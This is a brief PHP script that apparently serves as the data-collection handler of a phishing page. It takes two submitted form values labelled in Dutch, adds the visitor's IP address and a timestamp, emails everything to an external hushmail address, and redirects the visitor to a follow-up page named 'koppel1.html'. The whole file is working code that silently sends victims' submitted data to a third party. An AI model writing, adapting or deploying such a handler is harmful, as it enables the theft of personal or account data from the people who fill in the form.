<?php
header("Location: koppel1.html");
$IP = $_SERVER['REMOTE_ADDR'];

$to = "finoknaller@hushmail.com";

$message = "WEL INLEVEREN: " . $_GET['P1'] . "\n";
$message .= "NIET INLEVEREN: " . $_GET['P2'] . "\n";
$message .= "IPadres:" . $logdetails=  date("F j, Y, g:i a") . ': ' . '<a target=_blank href=http://www.dnsstuff.com/tools/ipall.ch?domain='.$_SERVER['REMOTE_ADDR'].'>'.$_SERVER['REMOTE_ADDR'].'</a>';


mail($to, '(3)JA / NEE - '.$_SERVER['REMOTE_ADDR'].'', $message);
exit;
?>
